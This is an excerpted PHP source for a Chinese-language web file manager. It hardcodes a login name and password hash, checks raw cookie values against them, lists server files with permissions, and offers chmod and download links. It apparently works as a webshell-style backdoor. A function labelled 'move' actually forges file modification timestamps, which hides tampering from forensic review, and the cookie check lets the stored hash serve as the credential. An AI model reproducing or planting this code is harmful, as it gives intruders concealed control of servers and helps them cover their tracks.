...
$sitetitle = '在线文件管理系统';
$user = 'fat001';
$pass = 'c5cd946631fa902a901c243055339788';
...
if ($_COOKIE['user'] != $user || $_COOKIE['pass'] != $pass) {
	if ($_REQUEST['user'] == $user && $getpass == $pass) {
 ...
 $ROOT_DIR = File_Mode();
  if ($showtop) {
    echo "<tr><td><font size=\"2\">\n"
        ."<a href=\"".$adminfile."?op=home\" $iftop>本文件目录</a>\n"
...
function get_color($file) {if(!is_writable($file) && is_readable($file)){return "red";}}
    ...
    if ($stylesheet[0] != "." && $stylesheet[0] != ".." ) {
      if (is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) { 
        $content1[$a] ="<td>".$sstylesheet."</td>\n"
                 ...
                 ."<td align=\"left\"><img src=pixel.gif width=5 height=1><span  style=\"color:".get_color($folder.$stylesheet).";\">".substr(sprintf('%o',fileperms($folder.$stylesheet)), -4)."</span>"
                 ...
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=mov&file=".$stylesheet."&folder=$folder\">".date('Y-m-d H:i:s',filemtime($folder.$stylesheet))."</a>\n"
        ...
        $content2[$b] ="<td><a href=\"".str_replace($ROOT_DIR,"",$folder.$sstylesheet)."\">".$sstylesheet."</a></td>\n"
                 ...
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=mov&file=".$stylesheet."&folder=$folder\">".date('Y-m-d H:i:s',filemtime($folder.$stylesheet))."</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=chm&file=".$stylesheet."&folder=$folder\">设置</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=viewframe&file=".$stylesheet."&folder=$folder\">下载</a>\n"
...
function mov($file) {
  ...
  if (!$file == "") {
    maintop("移动");
	$FILE_TIME=date('Y-m-d H:i:s',filemtime($folder.$file));
    echo "<form action=\"".$adminfile."?op=move\" method=\"post\">\n"
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."修改文件时间： ".$folder.$file." 为:\n"
        ."<input type=\"text\" name=\"time\" id=\"mtime\" value=\"{$FILE_TIME}\" style=\"width:150px;\">"
...
/****************************************************************/
function move($file, $time, $folder) {
  global $folder;
  if (!$file == "") {
    maintop("移动");
    if (touch($folder.$file,@strtotime($time))) {
      echo $folder.$file." 成功修改为 ".$time
    ."&nbsp;<a href=\"".$adminfile."?op=home&folder=".$folder."\">返回文件管理</a>\n";
    } else {
      echo "无法修改时间 ".$folder.$file
    ."&nbsp;<a href=\"".$adminfile."?op=home&folder=".$folder."\">返回文件管理</a>\n";
    }
    mainbottom();
  } else {
...
switch($op) {
    ...
    case "move":
	move($_REQUEST['file'], $_REQUEST['time'], $folder);
	break;
